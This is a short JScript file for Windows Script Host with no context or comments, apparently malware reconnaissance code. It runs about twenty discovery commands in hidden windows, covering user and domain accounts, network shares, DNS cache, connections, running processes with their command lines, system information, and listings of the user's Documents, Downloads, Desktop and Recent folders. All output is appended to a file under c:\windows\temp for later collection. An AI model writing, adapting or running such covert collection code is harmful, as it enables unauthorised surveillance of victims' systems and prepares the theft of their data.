var shell = new ActiveXObject("WScript.Shell");
var outFile = "c:\\windows\\temp\\result2.dat";
var userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%");
var cmds = [
    "net use",
    "net view",
    "ipconfig /displaydns",
    "dir \"" + userProfile + "\\Documents\"",
    "dir d:\\",
    "tracert /h 5 www.google.com",
    "netstat -ao",
    "tasklist /v",
    "net user",
    "wmic logicaldisk",
    "systeminfo",
    "dir \"" + userProfile + "\\Downloads\"",
    "whoami /all",
    "net view /domain",
    "wmic process get name,commandline,executablepath /format:list",
    "ipconfig /all",
    "dir \"" + userProfile + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent\"",
    "netstat -ano",
    "dir \"" + userProfile + "\\Desktop\"",
    "net share",
    "arp -a"
];
for (var i = 0; i < cmds.length; i++) {
    shell.Run("cmd.exe /c " + cmds[i] + " >> \"" + outFile + "\"", 0, true);
}
